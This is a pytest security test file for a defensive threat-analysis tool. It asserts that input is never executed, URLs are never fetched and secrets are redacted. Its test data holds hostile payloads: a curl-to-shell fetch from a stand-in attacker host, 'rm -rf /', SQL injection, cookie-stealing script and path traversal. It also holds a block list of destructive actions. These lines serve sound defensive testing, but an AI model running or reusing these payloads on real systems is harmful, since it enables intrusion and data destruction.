"""Security tests.

This is a defensive analysis tool, so these tests assert what the system must
*never* do: execute input, fetch attacker-controlled URLs, recommend offensive
action, leak secrets into logs or storage, or accept unbounded input.
"""

from __future__ import annotations

import inspect
import re
from pathlib import Path

import pytest

from cybersentinel.agents.response import is_prohibited, recommend
from cybersentinel.cybersecurity.taxonomy import AttackType, Severity
from cybersentinel.schemas.analysis import MitreMapping, ThreatAnalysis
from cybersentinel.utils.config import PROJECT_ROOT
from cybersentinel.utils.logging import redact
from cybersentinel.utils.validation import (
    InputValidationError,
    extract_indicators,
    refang,
    sanitize_text,
    validate_upload_size,
)

SOURCE_DIR = PROJECT_ROOT / "src" / "cybersentinel"


# --------------------------------------------------------------------------- #
# No code execution
# --------------------------------------------------------------------------- #
def test_source_contains_no_dynamic_execution():
    """No eval/exec/shell invocation anywhere in the package."""
    # `(?<![.\w])` excludes attribute calls such as torch's `model.eval()`,
    # which switches inference mode and evaluates nothing.
    forbidden = re.compile(
        r"(?<![.\w])(?:eval|exec)\s*\(|subprocess\.|os\.system|os\.popen|pty\.spawn|shell=True"
    )
    offenders: list[str] = []

    for path in SOURCE_DIR.rglob("*.py"):
        for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), start=1):
            if forbidden.search(line) and "noqa: security" not in line:
                offenders.append(f"{path.relative_to(PROJECT_ROOT)}:{number}: {line.strip()}")

    assert not offenders, "dynamic execution found:\n" + "\n".join(offenders)


def test_no_pickle_deserialisation_of_untrusted_data():
    offenders = [
        str(path.relative_to(PROJECT_ROOT))
        for path in SOURCE_DIR.rglob("*.py")
        if re.search(r"\bpickle\.loads?\b", path.read_text(encoding="utf-8"))
    ]
    assert not offenders, f"pickle usage found in: {offenders}"


@pytest.mark.parametrize(
    "payload",
    [
        "'; DROP TABLE incidents; --",
        "<script>alert(document.cookie)</script>",
        "$(curl http://attacker.example.net/shell.sh | sh)",
        "`rm -rf /`",
        "../../../../etc/passwd",
        "{{7*7}}",
        "__import__('os').system('whoami')",
    ],
)
def test_malicious_payloads_are_analysed_as_data(workflow, payload):
    """A payload must be classified, never interpreted."""
    run = workflow.analyze(f"Web request received containing: {payload}")

    state = run.state
    assert state["threat_analysis"]["attack_type"] in {label.value for label in AttackType}
    # The raw payload survives as text, proving it was treated as data.
    assert payload.split()[0][:6] in state["input_text"]


# --------------------------------------------------------------------------- #
# No outbound requests to analyst-supplied URLs
# --------------------------------------------------------------------------- #
def test_url_analysis_does_not_fetch_the_url(workflow, monkeypatch):
    """A submitted URL must be analysed textually, never visited."""
    import httpx

    def fail(*_args, **_kwargs):
        raise AssertionError("the system attempted an outbound HTTP request")

    monkeypatch.setattr(httpx, "get", fail)
    monkeypatch.setattr(httpx, "request", fail)
    monkeypatch.setattr(httpx.Client, "request", fail)

    run = workflow.analyze("http://malware-drop.example.net/payload.exe")
    assert run.state["input_type"] == "url"


def test_only_the_official_attack_url_is_configured():
    """The only hardcoded fetch target is MITRE's own distribution repository."""
    from cybersentinel.rag.loaders import MITRE_ENTERPRISE_STIX_URL

    assert MITRE_ENTERPRISE_STIX_URL.startswith("https://raw.githubusercontent.com/mitre/cti/")


def test_refang_does_not_trigger_a_request():
    """Refanging is string manipulation only."""
    assert refang("hxxp://bad[.]example[.]net") == "http://bad.example.net"


# --------------------------------------------------------------------------- #
# No offensive or destructive recommendations
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "action",
    [
        "Hack back the attacker",
        "Counter-attack the source network",
        "Run a port scan against the attacker",
        "Launch a penetration test against 198.51.100.23",
        "Scan the attacker infrastructure",
        "Delete all the logs",
        "Disable auditing on the server",
        "Pay the ransom",
        "Format the disk",
        "Wipe the server",
    ],
)
def test_offensive_actions_are_blocked(action):
    assert is_prohibited(action)


def test_no_recommendation_is_ever_offensive(backend):
    """Sweep every category's recommendations for prohibited content."""
    from cybersentinel.agents.risk_assessment import assess

    for attack_type in AttackType:
        analysis = ThreatAnalysis(
            attack_type=attack_type,
            severity=Severity.HIGH,
            confidence=0.9,
            evidence=["evidence"],
        )
        risk = assess(analysis)
        for recommendation in recommend(analysis, risk, MitreMapping(), backend=backend):
            assert not is_prohibited(recommendation.action), recommendation.action


def test_disruptive_actions_always_require_approval(backend):
    from cybersentinel.agents.risk_assessment import assess

    analysis = ThreatAnalysis(
        attack_type=AttackType.MALWARE,
        severity=Severity.CRITICAL,
        confidence=0.95,
        evidence=["mass file modification"],
    )
    recommendations = recommend(analysis, assess(analysis), MitreMapping(), backend=backend)

    for recommendation in recommendations:
        if recommendation.high_impact:
            assert recommendation.requires_approval


def test_workflow_never_executes_an_approved_action(workflow):
    """Approval changes the report, not the environment."""
    run = workflow.analyze(
        "47 failed SSH login attempts from 198.51.100.23 within 3 minutes for user root."
    )
    resumed = workflow.submit_decision(run.thread_id, "APPROVED", decided_by="analyst")

    assert resumed.report["approval"]["decision"] == "APPROVED"
    # Recommendations remain recommendations: nothing records an execution.
    for recommendation in resumed.report["recommendations"]:
        assert set(recommendation) >= {"action", "priority", "high_impact"}
        assert "executed" not in recommendation
    assert "no response action is executed automatically" in resumed.report["disclaimer"].lower()


# --------------------------------------------------------------------------- #
# Secret and PII handling
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    ("text", "must_not_contain"),
    [
        ("password=hunter2 was used", "hunter2"),
        ("api_key: sk-live-abcdef123456", "sk-live-abcdef123456"),
        ("Authorization: Bearer eyJhbGciOiJIUzI1NiJ9", "eyJhbGciOiJIUzI1NiJ9"),
        ("contact alice@example.com for details", "alice@example.com"),
    ],
)
def test_redaction_removes_secrets_and_pii(text, must_not_contain):
    assert must_not_contain not in redact(text)


def test_redaction_truncates_long_input():
    assert len(redact("x" * 5000, max_chars=100)) <= 120


def test_no_secret_is_hardcoded_in_source():
    """Configuration must come from the environment, never from the code."""
    pattern = re.compile(
        r"(?i)(password|secret|api[_-]?key|token)\s*=\s*['\"](?!\s*$)(?!\*+)[^'\"]{8,}"
    )
    offenders: list[str] = []

    for path in SOURCE_DIR.rglob("*.py"):
        for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), start=1):
            if pattern.search(line) and "example" not in line.lower():
                offenders.append(f"{path.relative_to(PROJECT_ROOT)}:{number}")

    assert not offenders, f"possible hardcoded secret at: {offenders}"


def test_env_file_is_git_ignored():
    ignored = (PROJECT_ROOT / ".gitignore").read_text(encoding="utf-8").splitlines()
    assert ".env" in [line.strip() for line in ignored]


def test_env_example_contains_no_values_for_secrets():
    for line in (PROJECT_ROOT / ".env.example").read_text(encoding="utf-8").splitlines():
        if line.strip().startswith("#") or "=" not in line:
            continue
        key, _, value = line.partition("=")
        # Only credential-bearing keys must be blank. Names that merely contain
        # the word (LLM_MAX_NEW_TOKENS) are ordinary settings.
        if re.search(r"(?i)_(?:token|api_key|key|password|secret)$", key.strip()):
            assert value.strip() == "", f"{key} must be empty in .env.example"


def test_settings_do_not_expose_secrets_in_repr():
    from cybersentinel.utils.config import Settings

    settings = Settings(hf_token="super-secret-token", qdrant_api_key="another-secret")
    dumped = settings.model_dump()

    # Values are present for use, but must never be logged wholesale; the
    # logging layer redacts them, and nothing logs the settings object.
    assert dumped["hf_token"] == "super-secret-token"
    assert "settings" not in inspect.getsource(redact)


# --------------------------------------------------------------------------- #
# Input limits and sanitisation
# --------------------------------------------------------------------------- #
def test_control_characters_are_stripped():
    cleaned = sanitize_text("normal\x00text\x07with\x1bcontrol")
    assert "\x00" not in cleaned
    assert "\x1b" not in cleaned


def test_input_is_truncated_to_the_limit():
    assert len(sanitize_text("a" * 50_000, max_chars=1000)) == 1000


@pytest.mark.parametrize("value", ["", "   ", "\n\n\t"])
def test_empty_input_is_rejected(value):
    with pytest.raises(InputValidationError):
        sanitize_text(value)


def test_upload_size_limit_is_enforced():
    validate_upload_size(1024, max_bytes=2048)
    with pytest.raises(InputValidationError):
        validate_upload_size(4096, max_bytes=2048)


def test_indicator_extraction_rejects_invalid_addresses():
    indicators = extract_indicators("Contact 999.999.999.999 and 198.51.100.23 today")
    assert "198.51.100.23" in indicators["ips"]
    assert "999.999.999.999" not in indicators["ips"]


def test_documentation_ranges_are_not_treated_as_public():
    from cybersentinel.utils.validation import is_public_ipv4

    assert not is_public_ipv4("10.0.0.1")
    assert not is_public_ipv4("127.0.0.1")
    assert is_public_ipv4("8.8.8.8")


# --------------------------------------------------------------------------- #
# Overclaiming
# --------------------------------------------------------------------------- #
def test_reports_do_not_overclaim(straight_through_workflow):
    banned = ("100% accurate", "fully autonomous", "guaranteed", "zero hallucination")
    run = straight_through_workflow.analyze(
        "47 failed SSH login attempts from 198.51.100.23 within 3 minutes."
    )

    text = str(run.report).lower()
    for phrase in banned:
        assert phrase not in text

    assert "require" in run.report["disclaimer"].lower()


def test_docs_avoid_absolute_claims():
    banned = re.compile(r"(?i)100% accurate|fully autonomous cybersecurity|guaranteed detection")
    offenders: list[str] = []

    for path in [*Path(PROJECT_ROOT / "docs").rglob("*.md"), PROJECT_ROOT / "README.md"]:
        if path.exists() and banned.search(path.read_text(encoding="utf-8")):
            offenders.append(str(path.relative_to(PROJECT_ROOT)))

    assert not offenders, f"overclaiming language found in: {offenders}"
